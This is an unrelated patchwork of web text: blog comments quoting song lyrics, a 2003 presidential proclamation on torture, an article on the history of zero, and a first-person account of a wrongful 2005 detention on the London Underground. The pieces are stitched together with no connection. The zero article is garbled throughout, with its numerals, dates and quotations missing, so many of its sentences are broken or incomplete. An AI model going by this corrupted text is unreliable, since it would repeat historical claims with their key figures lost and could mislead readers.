Play that funky music , white boy . ''
Just like the groove in the press briefing room , where sources say credit for the downloaded Chamillionaire ringer goes to Raddatz 's teenager .

Paper Lace The Night Chicago Died
In the heat of a summer night
In the land of the dollar bill
When the town of Chicago died
And they talk about it still When a man named Al Capone
Tried to make that town his own
And he called his gang to war
With the forces of the law I heard my mama cry
I heard her pray the night Chicago died
Brother what a night it really was
Brother what a fight it really was
Glory be I heard my mama cry
I heard her pray the night Chicago died
Brother what a night the people saw
Brother what a fight the people saw
Yes indeed And the sound of the battle rang
Through the streets of the old east side
' Til the last of the hoodlum gang
Had surrendered up or died
There was shouting in the street
And the sound of running feet
And I asked someone who said
Bout a hundred cops are dead I heard my mama cry
I heard her pray the night Chicago died
Brother what a night it really was
Brother what a fight it really was
Glory be !
I heard my mama cry
I heard her pray the night Chicago died
Brother what a night the people saw
Brother what a fight the people saw
Yes indeed And ther was no sound at all
But the clock upon the wall
Then the door burst open wide
And my daddy stepped inside
And he kissed my mama 's face
And he brushed her tears away The night Chicago died
The night Chicago died
Brother what a night the people saw
Brother what a fight the people saw
Yes indeed The night Chicago died
The night Chicago died
Brother what a night it really was
Brother what a fight it really was
Glory be The night Chicago died
The night Chicago died
Brother what a night the people saw
Brother what a fight the people saw
Yes indeed Posted by : C.Morris | Jan 9 , 2007 2:43:36 PM

In honor of Chicago and politics and war here 's the Graham Nash tribute :
So your brother 's bound and gagged
And they 've chained him to a chair
Wo n't you please come to Chicago just to sing
In a land that 's known as Freedom
How can such a thing be fair
Wo n't you please come to Chicago for the help that we can bring
We can change the world
Rearrange the world
It 's dying - to get better Politicians sit yourself down
There 's nothing for you here
Wo n't you please come to Chicago for a ride
Do n't ask Jack to help you
" Cause he 'll turn the other ear
Wo n't you please come to Chicago or else join the other side
We can change the world
Rearrange the world
It 's dying - if you believe in justice
It 's dying - and if you believe in freedom
It 's dying - let a man live his own life
It 's dying - rules and regulations
Who needs them , open up the door Somehow people must be free
I hope the day comes soon
Wo n't you please come to Chicago , show your face
From the bottom of the ocean
To the mountains of the moon
Wo n't you please come to Chicago , no one else can take your place
We can change the world ....
Graham Nash , " Chicago " --- more apropos now than ever .

More bad tunes for the Swamp Rats !
LADY , by Styx !
Dedicated to Ms. ' Radish ' ; Lady , when youre with me Im smiling
Give me all your love
Your hands build me up when Im sinking
Just touch me and my troubles all fade
Lady , from the moment I saw you
Standing all alone
You gave all the love that I needed
So shy , like a child who has grown
Youre my lady of the morning
Love shines in your eyes
Sparkling , clear , and lovely
Youre my lady Lady , turns me on when Im lonely
Show me all your charm
Evenings when she lays down beside me
Just take me gently into your arms
Your my lady of the moaning
Love shines in your eyes
Spanking , clear , and lovely
Youre my LAAAADEEEEE !!

Holdin on to one another 's hand

And then you put your arms around me
And we tumble to the ground
And then you say I think we 're alone now
There does n't seem to be anyone around
I think we 're alone now
The beating of the hearts is the only sound Look at the way
We gotta hide what we 're doin
' cause what would they say
If they ever knew
And so we 're repeat chorus I think we 're alone now ..

We review them first in an effort to remove foul language , commercial messages , irrelevancies and unfair attacks .
Thank you for your patience .
The comments to this entry are closed .
Interesting — and one more reason to love the internet ( nothing really disappears ) .
Today , on the United Nations International Day in Support of Victims of Torture , the United States declares its strong solidarity with torture victims across the world .
Torture anywhere is an affront to human dignity everywhere .
We are committed to building a world where human rights are respected and protected by the rule of law .
Freedom from torture is an inalienable human right .
The Convention Against Torture and Other Cruel , Inhuman or Degrading Treatment , ratified by the United States and more than 130 other countries since 1984 , forbids governments from deliberately inflicting severe physical or mental pain or suffering on those within their custody or control .
Yet torture continues to be practiced around the world by rogue regimes whose cruel methods match their determination to crush the human spirit .
Beating , burning , rape , and electric shock are some of the grisly tools such regimes use to terrorize their own citizens .
These despicable crimes cannot be tolerated by a world committed to justice .
Notorious human rights abusers , including , among others , Burma , Cuba , North Korea , Iran , and Zimbabwe , have long sought to shield their abuses from the eyes of the world by staging elaborate deceptions and denying access to international human rights monitors .
Until recently , Saddam Hussein used similar means to hide the crimes of his regime .
With Iraq ’s liberation , the world is only now learning the enormity of the dictator ’s three decades of victimization of the Iraqi people .
Across the country , evidence of Baathist atrocities is mounting , including scores of mass graves containing the remains of thousands of men , women , and children and torture chambers hidden inside palaces and ministries .
The most compelling evidence of all lies in the stories told by torture survivors , who are recounting a vast array of sadistic acts perpetrated against the innocent .
Their testimony reminds us of their great courage in outlasting one of history ’s most brutal regimes , and it reminds us that similar cruelties are taking place behind the closed doors of other prison states .
The United States is committed to the world - wide elimination of torture and we are leading this fight by example .
I call on all governments to join with the United States and the community of law - abiding nations in prohibiting , investigating , and prosecuting all acts of torture and in undertaking to prevent other cruel and unusual punishment .
I call on all nations to speak out against torture in all its forms and to make ending torture an essential part of their diplomacy .
I further urge governments to join America and others in supporting torture victims ’ treatment centers , contributing to the UN Fund for the Victims of Torture , and supporting the efforts of non-governmental organizations to end torture and assist its victims .
No people , no matter where they reside , should have to live in fear of their own government .
Nowhere should the midnight knock foreshadow a nightmare of state - commissioned crime .
The suffering of torture victims must end , and the United States calls on all governments to assume this great mission .
George W. Bush ( ‘s Speechwriters ) , June 26 , 2003

Why then have we not written an article on zero as one of the first in the archive ?
The reason is basically because of the difficulty of answering the question in a satisfactory form .
If someone had come up with the concept of zero which everyone then saw as a brilliant innovation to enter mathematics from that time on , the question would have a satisfactory answer even if we did not know which genius invented it .
The historical record , however , shows quite a different path towards the concept .
Zero makes shadowy appearances only to vanish again almost as if mathematicians were searching for it yet did not recognise its fundamental significance even when they saw it .
The first thing to say about zero is that there are two uses of zero which are both extremely important but are somewhat different .
One use is as an empty place indicator in our place - value number system .
Hence in a number likethe zero is used so that the positions of theandare correct .
Clearlymeans something quite different .
The second use of zero is as a number itself in the form we use it as .
There are also different aspects of zero within these two uses , namely the concept , the notation , and the name .
Our name " zero " derives ultimately from the Arabicwhich also gives us the word " cipher " .
Neither of the above uses has an easily described history .
It just did not happen that someone invented the ideas , and then everyone started to use them .
Also it is fair to say that the number zero is far from an intuitive concept .
Mathematical problems started as ' real ' problems rather than abstract problems .
Numbers in early historical times were thought of much more concretely than the abstract concepts which are our numbers today .
There are giant mental leaps fromhorses to " things " and then to the abstract idea of " five " .
If ancient peoples solved a problem about how many horses a farmer needed then the problem was not going to haveor - as an answer .
One might think that once a place - value number system came into existence then theas an empty place indicator is a necessary idea , yet the Babylonians had a place - value number system without this feature for overyears .
Moreover there is absolutely no evidence that the Babylonians felt that there was any problem with the ambiguity which existed .
Remarkably , original texts survive from the era of Babylonian mathematics .
The Babylonians wrote on tablets of unbaked clay , using cuneiform writing .
The symbols were pressed into soft clay tablets with the slanted edge of a stylus and so had a wedge - shaped appearanceand hence the name cuneiform .
Many tablets from aroundBC survive and we can read the original texts .
Of course their notation for numbers was quite different from oursand not based onbut onbut to translate into our notation they would not distinguish betweenandthe context would have to show which was intended .
It was not until aroundBC that the Babylonians put two wedge symbols into the place where we would put zero to indicate which was meant , or '' The two wedges were not the only notation used , however , and on a tablet found at Kish , an ancient Mesopotamian city located east of Babylon in what is today south - central Iraq , a different notation is used .
This tablet , thought to date from aroundBC , uses three hooks to denote an empty place in the positional notation .
Other tablets dated from around the same time use a single hook for an empty place .
There is one common feature to this use of different marks to denote an empty position .
This is the fact that it never occured at the end of the digits but always between two digits .
So although we find '' we never find ' ' .
One has to assume that the older feeling that the context was sufficient to indicate which was intended still applied in these cases .
If this reference to context appears silly then it is worth noting that we still use context to interpret numbers today .
If I take a bus to a nearby town and ask what the fare is then I know that the answer " It 's three fifty " means three pounds fifty pence .
Yet if the same answer is given to the question about the cost of a flight from Edinburgh to New York then I know that three hundred and fifty pounds is what is intended .
We can see from this that the early use of zero to denote an empty place is not really the use of zero as a number at all , merely the use of some type of punctuation mark so that the numbers had the correct interpretation .
Now the ancient Greeks began their contributions to mathematics around the time that zero as an empty place indicator was coming into use in Babylonian mathematics .
The Greeks however did not adopt a positional number system .
It is worth thinking just how significant this fact is .
How could the brilliant mathematical advances of the Greeks not see them adopt a number system with all the advantages that the Babylonian place - value system possessed ?
The real answer to this question is more subtle than the simple answer that we are about to give , but basically the Greek mathematical achievements were based on geometry .
Although Euclid ' scontains a book on number theory , it is based on geometry .
In other words Greek mathematicians did not need to name their numbers since they worked with numbers as lengths of lines .
Numbers which required to be named for records were used by merchants , not mathematicians , and hence no clever notation was needed .
Now there were exceptions to what we have just stated .
The exceptions were the mathematicians who were involved in recording astronomical data .
Here we find the first use of the symbol which we recognise today as the notation for zero , for Greek astronomers began to use the symbol O .
There are many theories why this particular notation was used .
Some historians favour the explanation that it is omicron , the first letter of the Greek word for nothing namely " ouden " .
Neugebauer , however , dismisses this explanation since the Greeks already used omicron as a number - it representedthe Greek number system was based on their alphabet .
Other explanations offered include the fact that it stands for " obol " , a coin of almost no value , and that it arises when counters were used for counting on a sand board .
The suggestion here is that when a counter was removed to leave an empty column it left a depression in the sand which looked like O. Ptolemy in thewritten aroundAD uses the Babylonian sexagesimal system together with the empty place holder O .
By this time Ptolemy is using the symbol both between digits and at the end of a number and one might be tempted to believe that at least zero as an empty place holder had firmly arrived .
This , however , is far from what happened .
Only a few exceptional astronomers used the notation and it would fall out of use several more times before finally establishing itself .
The idea of the zero placecertainly not thought of as a number by Ptolemy who still considered it as a sort of punctuation markmakes its next appearance in Indian mathematics .
The scene now moves to India where it is fair to say the numerals and number system was born which have evolved into the highly sophisticated ones we use today .
Of course that is not to say that the Indian system did not owe something to earlier systems and many historians of mathematics believe that the Indian use of zero evolved from its use by Greek astronomers .
As well as some historians who seem to want to play down the contribution of the Indians in a most unreasonable way , there are also those who make claims about the Indian invention of zero which seem to go far too far .
For example Mukherjee inclaims :- What is certain is that by aroundAD the use of zero as a number came into Indian mathematics .
The Indians also used a place - value system and zero was used to denote an empty place .
In fact there is evidence of an empty place holder in positional numbers from as early asAD in India but some historians dismiss these as later forgeries .
Let us examine this latter use first since it continues the development described above .
In aroundAD Aryabhata devised a number system which has no zero yet was a positional system .
He used the word " kha " for position and it would be used later as the name for zero .
There is evidence that a dot had been used in earlier Indian manuscripts to denote an empty place in positional notation .
It is interesting that the same documents sometimes also used a dot to denote an unknown where we might use .
Later Indian mathematicians had names for zero in positional numbers yet had no symbol for it .
The first record of the Indian use of zero which is dated and agreed by all to be genuine was written inWe have an inscription on a stone tablet which contains a date which translates to .
The inscription concerns the town of Gwalior , km south of Delhi , where they planted a gardenbyhastas which would produce enough flowers to allowgarlands per day to be given to the local temple .
Both of the numbersandare denoted almost as they appear today although theis smaller and slightly raised .
We now come to considering the first appearance of zero as a number .
Let us first note that it is not in any sense a natural candidate for a number .
From early times numbers are words which refer to collections of objects .
Certainly the idea of number became more and more abstract and this abstraction then makes possible the consideration of zero and negative numbers which do not arise as properties of collections of objects .
Of course the problem which arises when one tries to consider zero and negatives as numbers is how they interact in regard to the operations of arithmetic , addition , subtraction , multiplication and division .
In three important books the Indian mathematicians Brahmagupta Mahavira and Bhaskara tried to answer these questions .
Brahmagupta attempted to give the rules for arithmetic involving zero and negative numbers in the seventh century .
He explained that given a number then if you subtract it from itself you obtain zero .
He gave the following rules for addition which involve zero :- Subtraction is a little harder :- Brahmagupta then says that any number when multiplied by zero is zero but struggles when it comes to division : - Really Brahmagupta is saying very little when he suggests thatdivided by zero is .
Clearly he is struggling here .
He is certainly wrong when he then claims that zero divided by zero is zero .
However it is a brilliant attempt from the first person that we know who tried to extend arithmetic to negative numbers and zero .
In , aroundyears after Brahmagupta wrote his masterpiece , Mahavira wrotewhich was designed as an updating of Brahmagupta 's book .
He correctly states that :- However his attempts to improve on Brahmagupta 's statements on dividing by zero seem to lead him into error .
He writes :- Since this is clearly incorrect my use of the words " seem to lead him into error " might be seen as confusing .
The reason for this phrase is that some commentators on Mahavira have tried to find excuses for his incorrect statement .
Bhaskara wrote overyears after Brahmagupta .
Despite the passage of time he is still struggling to explain division by zero .
He writes :- So Bhaskara tried to solve the problem by writing .
At first sight we might be tempted to believe that Bhaskara has it correct , but of course he does not .
If this were true then× ∞ must be equal to every number , so all numbers are equal .
The Indian mathematicians could not bring themselves to the point of admitting that one could not divide by zero .
Bhaskara did correctly state other properties of zero , however , such as , and Perhaps we should note at this point that there was another civilisation which developed a place - value number system with a zero .
This was the Maya people who lived in central America , occupying the area which today is southern Mexico , Guatemala , and northern Belize .
This was an old civilisation but flourished particularly betweenand .
We know that bythey used a place - value number system to basewith a symbol for zero .
However their use of zero goes back further than this and was in use before they introduced the place - valued number system .
This is a remarkable achievement but sadly did not influence other peoples .
You can see a separate article about Mayan mathematics
The brilliant work of the Indian mathematicians was transmitted to the Islamic and Arabic mathematicians further west .
It came at an early stage for al - Khwarizmi wrotewhich describes the Indian place - value system of numerals based on , and .
This work was the first in what is now Iraq to use zero as a place holder in positional base notation .
Ibn Ezra , in thecentury , wrote three treatises on numbers which helped to bring the Indian symbols and ideas of decimal fractions to the attention of some of the learned people in Europe .
describes the decimal system for integers with place values from left to right .
In this work ibn Ezra uses zero which he calls galgalmeaning wheel or circle .
Slightly later in thecentury al - Samawal was writing :- The Indian ideas spread east to China as well as west to the Islamic countries .
Inthe Chinese mathematician Qin Jiushao wrotewhich uses the symbol O for zero .
A little later , in Zhu Shijie wrotewhich again uses the symbol O for zero .
Fibonacci was one of the main people to bring these new ideas about the number system to Europe .
As the authors ofwrite : - Inhe described the nine Indian symbols together with the signfor Europeans in aroundbut it was not widely used for a long time after that .
It is significant that Fibonacci is not bold enough to treatin the same way as the other numberssince he speaks of the " sign " zero while the other symbols he speaks of as numbers .
Although clearly bringing the Indian numerals to Europe was of major importance we can see that in his treatment of zero he did not reach the sophistication of the Indians Brahmagupta Mahavira and Bhaskara nor of the Arabic and Islamic mathematicians such as al - Samawal
One might have thought that the progress of the number systems in general , and zero in particular , would have been steady from this time on .
However , this was far from the case .
Cardan solved cubic and quartic equations without using zero .
He would have found his work in the 's so much easier if he had had a zero but it was not part of his mathematics .
By the 's zero began to come into widespread use but still only after encountering a lot of resistance .
Of course there are still signs of the problems caused by zero .
Recently many people throughout the world celebrated the new millennium onJanuary .
Of course they celebrated the passing of onlyyears since when the calendar was set up no year zero was specified .
Although one might forgive the original error , it is a little surprising that most people seemed unable to understand why the third millennium and thecentury begin onJanuary .
Zero is still causing problems !

Innocent in London – ‘ Suspicious behaviour on the tube ’
The Police decided that wearing a rain jacket , carrying a rucksack with a laptop inside , looking down at the steps while going in a tube station and checking your phone for messages just tick too many boxes on their checklist and make you a terrorist suspect .
How many other people are not only wrongly detained but wrongly arrested every week in similar circumstances as myself ?
And how many of them are also computer and telecoms enthusiasts that fit the Police 's terrorist behavioural profile so well ?
I accept and understand spot checks can be useful , but profiling ... this would be a joke if it did n't affect many ‘ innocent bystanders ’ .
Met Commissioner Sir Ian Blair asserted
‘ We are not in the business of stopping and searching people who fit a particular profile . ’
What then was the premise for even stopping me ?
While a police officer did state that my rain jacket was ‘ too warm for the season ’ , could it have been instead that the weather was too cold for the season ?
This is what the other Met , the Met Office had to say about the weather the day before : ‘ London recorded its coldest July day for 25 years on the 27th when temperatures only reached 15.6 °C . ’
At least I 'm still alive and , over a month later , no longer under arrest .
The Police eventually decided to take No Further Action ( NFA ) : ‘ a decision not to proceed with a prosecution ’ .
In a democratic country such as the UK , one would be forgiven for naively thinking that this is the end of the matter .
Under the current laws the Police are not only entitled to keep my fingerprints , palm prints ( IDENT1 ) and DNA samples ( NDNAD ) , but apparently they are also entitled to hold on to what they gathered during their investigation : notepads of the arresting officers , photographs , interviewing tapes and any other documents they collected and entered in the Police National Computer ( PNC ) .
Hielke Hijmans from the Office of the European Data Protection Supervisor puts it succinctly : ‘ terrorism is not out of this world when you retain data ’
Are n't the Police supposed to keep tabs only on convicted criminals and individuals under investigation ?
So even though the Police concluded I was arrested without a cause , otherwise they would have had a duty to prosecute me , personal information remains in the Police national computer ; which can be shared with Europol and Interpol , in other Police databases around the world .
Is n't a state that keeps files on innocent persons a police state ?
This gradual erosion of our fundamental liberties should be of concern to us all .
‘ LONDON ( Reuters ) : – A London underground train station was evacuated and part of a main east - west line closed in a security alert on Thursday , three weeks after suicide bombers killed 52 people on the transport network , police said .
A Transport Police spokeswoman said Southwark station was closed and Jubilee Line services suspended between Waterloo and Canary Wharf in the east London business district . ’ [ published on 2005 - 07 - 28 at 21:03 ]
This Reuters story was written while the police were detaining me in Southwark tube station and the bomb squad was checking my rucksack .
When they were through , the two explosive specialists walked out of the tube station smiling and commenting ‘ nice laptop ’ .
The officers offered apologies on behalf of the Metropolitan Police .
Then they arrested me .
Key events timeline
19:10 From my workplace in Southwark , South London , I arrange by text message ( SMS ) to meet my girlfriend at Hanover Square .
To save time – as I suppose – I decide to the take the tube to Bond Street instead of my usual bus .
I am wearing greenish Merrell shoes , black trousers , t- shirt , black lightweight Gap jumper , dark grey / black light rainproof Schott jacket and grey Top Shop cap .
I am carrying a black Tom Bihn rucksack I use as a workbag .
19:21 I enter Southwark tube station , passing uniformed police officers by the entrance , and more police beyond the gate .
I walk down to the platform , peering down to see the steps as , thanks to a small eye infection , I 'm wearing specs instead of my usual contact lenses .
( The picture was taken on 2006 - 01 - 18 during a part reenactment for BBC One.

The platform is mostly empty .
The next train is scheduled to arrive in a few minutes .
As other people drift onto the platform , I sit down against the wall with my rucksack still on my back .
I check for messages on my phone , then take out a printout of an article about Wikipedia from inside jacket pocket and begin to read .
The train enters the station .
Police officers , all uniformed men , appear on the platform and surround me .
They ask me to take off my rucksack .
They must immediately notice my French accent , still strong after living more than 12 years in London .
They handcuff me – hands behind my back ( the handcuffs have a rigid bar between the two cuffs – i.e. not like the ones often shown on TV ) .
They take my rucksack out of my sight .
They explain that this is for my safety , and that they are acting under the authority of the Terrorism Act .
I am told that I am being stopped and searched because they found my behaviour suspicious ( from direct observation and then from watching me on the CCTV system ) :
I went into the station without looking at the police officers at the entrance or by the gates , i.e .
I was ‘ avoiding them ’
two other men entered the station at about the same time as me
I am wearing a jacket ‘ too warm for the season ’
I am carrying a bulky rucksack
I kept my rucksack with me at all times ( I had it on my back )
I looked at people coming on the platform
I played with my mobile phone and then took a paper from inside my jacket .
They empty the content of all my pockets into two of their helmets and search me .
They loosen my belt .
One or two trains arrive and depart normally , with people getting on and off .
Then a train arrives , and moves slowly right through the station .
The driver is told not to stop .
After that , no more trains pass through the station .
We move away from the edge of the platform into the emergency staircase .
We ’re shown the way by two London Underground staffs that then disappear .
I sit down on the ( dirty ) steps .
Some police officers go up and later come back .
Their radio system does not work deep down in the station .
The police say they can't validate my address .
I suggest they ask the security guard where I work , two streets away .
They use walkie - talkies to pass the phone number I give them to colleagues .
They swap the handcuffs from behind my back to in front of my body , and we move up the escalators to the ticket office floor of the station .
I sit in the booth by the ticket gates for about one minute before a police officer decides we should go outside .
We go up to the station doors , and I realise that the station is cordoned off .
( The two photographs below are courtesy of London SE1 . )
Two bomb squad officers pass by getting out of the station .
One turns to me and says in a joking tone : ‘ Nice laptop ! ’
A police officer expresses apologies on behalf of the Metropolitan Police , and explains that we are waiting for a more senior officer to express further apologies .
They take off the handcuffs and start giving me back my possessions : my purse , keys , some papers .
Another police officer interferes , saying that this is not proper .
I am handcuffed again .
A police van arrives and I am told that I will wait in the back .
After about five minutes , a police officer formally arrests me ( until that point I was apparently only detained ) .
20:43 Arrested for suspicious behaviour and public nuisance , I am driven off to Walworth police station .
20:50 Forms are filled in ( Code : MS - Custody No : 0504437 ) , and my handcuffs ( double locked ) taken off so I can write my address .
I am given a form 3053 about my rights .
I make one correction to the police statement describing my detention : no train passed before I was stopped .
I empty my pockets of the few things they had given me back at the tube station , and am searched again .
My possessions are put in evidence bags .
They take two Polaroid photographs ( I stand my back to the wall ) .
A few minutes later , they take another set of two .
After washing my hand , a female police officer fingerprints me ( all the fingers and palms ) by putting some grease on my hands and holding them on a glass surface of some piece of equipment .
She then takes DNA swabs from each side of my mouth .
22:06 I am allowed a phone call to my girlfriend : a female police officer dials the number , asks for my girlfriend and tell her that she will transfer me over .
My girlfriend is crying and keeps repeating : ‘ What happened , I thought you were injured or had an accident , where were you , why did n't you call me back ’ .
I explain that I 'm fine and in a police station , my phone was taken and the police officers would n't allow me to call .
She wants to come to the station .
I try to reassure her and ask her to stay at home as I do n't know how long it 'll take and she caught a cold while waiting and looking for me outside .
22:14 I am put into an individual police cell .
I ask for a glass of water .
The officer says ‘ yes ’ but does n't bring it .
About 40 minutes later a female officer asks if I am ok .
I again request a glass of water , and it is brought to me .
23:15 A plainclothes officer tells me that my flat will be searched under the Terrorism Act .
I request that my girlfriend be called beforehand , so that she wo n't be too scared .
This request is accepted , and I am asked for her phone number .
I do n't know it – it is stored in my phone – so I explain it is with the officer at the desk .
I later find out that they do n't call her .
Apart from the two visits to the cell ( the one check and the info about the search ) , every now and then I notice an eye behind the eyehole but I 'm not told anything .
There 's a camera as well .
Apparently I was on ‘ half hourly checks ’.
2005-07-29 00:25-01:26 at my flat .
Three uniformed police officers search my flat and interview my girlfriend .
One of them asks her to show him some files on her laptop ; he 's particularly interested in all ‘ documents ’ .
They take away from the flat an old IBM laptop , a BeBox tower computer ( an obsolete kind of PC from the mid 1990s ) , a frequency counter ( picked it up at a radio amateur junk fair because it looked interesting ) , a radio scanner ( receives short wave radio stations ) , a blue RS232C breakout box ( a tool I used to use when reviewing modems for computer magazines ) , some aerials and an earpiece .
They apparently do not take but have a good look at several mobile phones , a handheld GPS receiver ( positioning device with maps , very useful when walking ) , a Black Hat computer security conference leaflet , envelopes with addresses , maps of Prague and London Heathrow , some business cards , some photographs I took – in particular techie ones such as the ones of the ACM97 conference – for the 50 years of the Association of Computing Machinery , and some cables .
This original list is from my girlfriend 's memory , or what we have noticed is missing since ( I have updated the list based on what I eventually got back from the Police ) .
The police officers left a notice of the powers to search premises , but this does n't include an inventory .
03:06 I am retrieved from my cell and formally interviewed by a plainclothes CID officer .
I see my rucksack for the first time since I took it off at the tube station .
I also notice some of my possessions from home , all bagged up in evidence bags except the tower computer .
This interview is recorded on two tapes .
The police again read out their version of events .
I make two corrections : again pointing out that no train passed between my arrival on the platform and when I was detained , and that I did n't take any wire out of my pocket – I did n't have any wire .
The officer suggests the computer cables I had in my rucksack could have been confused for wires .
I tell him I did n't take my rucksack off until asked by the police so this is impossible .
Three items I was carrying seem to be of particular interest to the officer :
a small promotional booklet I got at the cinema screening of the film The Assassination of Richard Nixon ,
, a folded A4 page where I did some doodles in red ink .
The police suspect it could be a map :
‘ It could be doodles but is it a plan of the station or anything like that ? ’ ( it really could be anything one would like to see in the doodles ; I have no recollection when or why I did them ) , and
the active part of an old work pass where one can see the induction loop and one integrated circuit .
Items from the flat the police officer asks about : the RS232C breakout box , the radio scanner and the frequency counter .
The officer explains what made them change their mind and arrest me instead of releasing me .
It was because of my connection with my employer .
Apparently , on August 4th , 2004 there was a firearms incident at the company where I work .
( The next day I find out that there had indeed been a hoax call the previous year , apparently from a temp worker claiming there was an armed intruder in one of the buildings . )
Also that some staff had been seen taking photographs of trains at the tube station with a camera phone .
( Most of my colleagues do have camera phones – also on 2nd June , as part of a team building exercise , new graduates were supposed to photograph landmarks and try to get a picture of themselves with a policeman . )
04:27 The interviewing officer releases me on bail , without requiring security .
On my 60B bail form it says ‘ I have been granted bail in accordance with the Bail Act , 1976 , under the provisions of Section 34( 5 ) / ( 7 ) Police and Criminal Evidence Act 1984 and that I must surrender to custody at Walworth Police Station on Wednesday 31 August , 2005 at 09:00 . ’
He gives me back most of the contents of my pockets , including my Oyster card , USB key and iPod ) and a few things from my rucksack ( umbrella and eye drop bottles ) .
Initially he says he will keep my mobile phone .
I ask if I can at least have the SIM card ?
He says no , that 's what they need ; but he eventually changes his mind and lets me keep the whole phone .
I leave the police station and take a night bus home .
The next day .
I get a solicitor and arrange to meet him on the Monday .
The solicitor advises waiting until 31st August .
09:00 I arrive at police station to surrender to custody as required by bail , and am joined by my solicitor five minutes later .
We are invited into a small room by a plainclothes police officer a further few minutes later .
The officer tells us that it's ‘ NFA ’ ( no further action ) , explains that this means that they are dropping the charges , and briefly apologises .
The officer ( DS ) in charge of the case is away from the station so the process of clearing up my case is suspended until he signs the papers cancelling the bail and authorising the release of my possessions .
The meeting lasts about five minutes .
I send Subject Access request letters to the Data Protection Registrars of
London Underground ( the DPR entry for the London Underground does n't exist anymore ; I 've since realised that Transport for London took control of the Tube in 2003 ) ,
Transport for London , registration number : Z5623601 ( on 2005 - 09 - 05 , they replied that the ‘ retention period for recording of stations is fourteen days ’ ) ,
the British Transport Police , registration number : Z4882139 ( on 2005 - 09 - 14 , they sent a reply which is just explaining some aspects of the Data Protection Act – no data included and no information as to when they might send the data requested ) and
the Metropolitan Police ( on 2005 - 09 - 20 , they replied with a form asking for more details ; on 2005 - 09 - 27 , I sent back form 3019B with a certified copy of my passport and a £ 10 cheque ; on 2005 - 10 - 04 , they sent a letter confirming my ‘ application has been passed to the National Identification Service who are responsible for conducting searches on the PNC ’ ; I eventually got the Subject Access , see below for more info ) .
The first three letters ask for any data , including CCTV footage , related to the incident on July 28 , while the final one is much more generic asking for any data they have on me .
They all have forty days to respond .
I talk to my solicitor about ensuring the Police return all my possessions , give us all the investigation documents ( which they may or may not do ) and expunge police records ( apparently unlikely to happen ) .
The solicitor sends a letter to the officer in charge of my case asking him to authorise the release of my possessions and forward us a copy of the custody record , and conveying to him how upset I am .
I write to my Member of Parliament about my concerns on what is happening to our civil liberties .
The Guardian publishes a slightly edited version of this page titled ‘ Suspicious behaviour on the tube ’ on the front page of the 2005 - 09 - 22 edition .
A great many thanks to those ( Andy & Will ) who convinced me I should publish this story ( against the advice of my solicitor who explained there 's often lots of stigma associated with having been arrested even when innocent ) , to those ( Will & Andrew ) who helped me edit it and to everyone at the Guardian ( especially Jack , Ian , Alan , Paul and Sarah ) .
The Guardian 's front page is shown on Newsnight !
The feedback I receive is very supportive .
In some email messages , the senders mentioned reading the article prompted them to contact their Member of Parliament .
Discussions and comments are happening on many websites .
It clearly justifies , a posteriori , this publication .
My gratitude to everyone who offered sympathy and to those doing something to ensure civil liberties are respected in the UK ( and everywhere else ) .
I participate in a one hour and half live interview ( MP3 - 20.3 MB ) on RampART radio ( Indymedia ) .
I talk to my solicitor .
He has n't received any response from the Police to his letter dated 2005 - 09 - 08 ( neither have I ) .
He will send another letter higher up the hierarchy .
I realise that it will now be extremely difficult , if not impossible , for me to travel to the USA ( and this may limit my career options ) : ‘ Under United States visa law people who have been arrested are required to declare the arrest when applying for a visa . ’
The visa application process takes ‘ a minimum of 14 to 16 weeks ’ and before that ‘ Applicants applying for a visa at the Embassy in London are required to furnish a Subject Access statement from the National Identification Service at New Scotland Yard ’ .
There 's no guarantee that a visa will be issued .
The Dallas Morning News publishes ‘ Brits wonder if terror bill goes too far ’ by Tod Robberson , European Bureau Chief , on the front page of the 2005 - 10 - 01 edition .
The article is partly based on an interview I did with Tod Robberson .
( This article has since been syndicated with the headline : ‘ Britons wonder if anti-terrorism efforts go too far ’ ; it has been published in at least fifteen other US newspapers . )
He asked the Police why they arrested me : ‘ Ms. Goodall [ a police spokeswoman ] declined to say why Mr. Mery 's behavior was regarded as suspicious . ’
He also quotes me : ‘“ The whole thing about the jacket worried me .
That was the excuse they used to kill Jean de Menezes .
If you think about all of the risks of being attacked by terrorists , and then you think of 3,000 police carrying guns with shoot - to - kill orders , it 's kind of worrying .
Terrorism is a great danger , but I think the danger from the police is equal as well . ” ’
The police asked my solicitor that I contact them ( this is following the letter my solicitor sent exactly a month ago ) .
I talk to them briefly .
They should call me back on Monday to arrange a meeting later in the week .
At this meeting I 'm looking to get my possessions back , all the documents related to the investigation and a formal apology .
I also want to discuss the possibility of the record of my arrest being expunged .
Monetary compensation would be welcome as well ( I had to buy another laptop ) .
I 'm invited to participate on BBC Radio Five Live in a special The Way Forward news programme debating issues three months since the London bombings .
Matthew Bannister interviews me ( 6.6 MB ) at around twenty past midnight .
( In the full programme my bit is from 2h22 ' 02 " to 2h32 ' 25 " . )
15:00 I visit the police station with my solicitor .
The police officer gives me a partial copy of the Custody Record ( Form 57 ) .
It does not contain the inventories of the content of my rucksack or what they took from the flat .
The detail pages are not numbered and do not include the ‘ facts of arrest ’ .
The Reasons for arrest is listed as : ‘ Other offence causing a public nuisance .
DP [ detained prisoner ] caused a major evacuation of three main line rail stations after his deliberate actions caused police to believe he had explosives ’ .
To the best of my knowledge this is factually incorrect , only Southwark tube station was closed .
I could n't find any mention of even one main line rail station being closed ( if you 're aware of any please email me ) .
On the form they note : ‘ DP is calm on arrival [ at the station ] , almost too calm ’ and as a consequence I was ‘ placed in a video cell on half hourly checks ’ .
Interesting to realise that being calm is something that disturbs the police !
The officer brings in the items they took when they searched my flat , and the three items I had on me ( promotional booklet , the page with doodles and the pass ) for which they had a special interest .
I point out that the rucksack and its content are not there .
He goes away to find these other items and brings them back .
I notice that some items I thought they had taken from the flat are not there .
Apparently my original list was erroneous – it included items they had a good look at but did n't take .
When the rucksack is taken out of the evidence bag , I notice that it has been cut open .
( Many thanks to Darcy at Tom Bihn who offered me a replacement bag . )
The officer suggest I send him a complaint letter .
The officer believed a Bail Cancellation Notice ( Form 60C ) had been given to me when they told me they did n't press charge .
After having to insist that this was n't the case , I get the form , dated only 2005 - 10 - 05 and stating that the need for me to ‘ return to Walworth Police Station has been cancelled [ as ] no further action is being taken ( reason ) : insufficient evidence ’ .
After being reminded , the officer goes to make a copy of one ( of the two ) interviewing tapes and give it to me .
The recording quality is poor .
The tape is copyrighted by the Metropolitan Police .
16:10 I leave the station with two very heavy big transparent plastic evidence bags full with the possessions I got back ( two months and two weeks after the police took them ) .
They will keep on file my fingerprints , palm prints , DNA samples and photographs , the arresting officers ' notebooks , the interviewing tapes and any other documents they collected or created during their investigation ( CCTV tapes , details of all the officers involved , etc . )
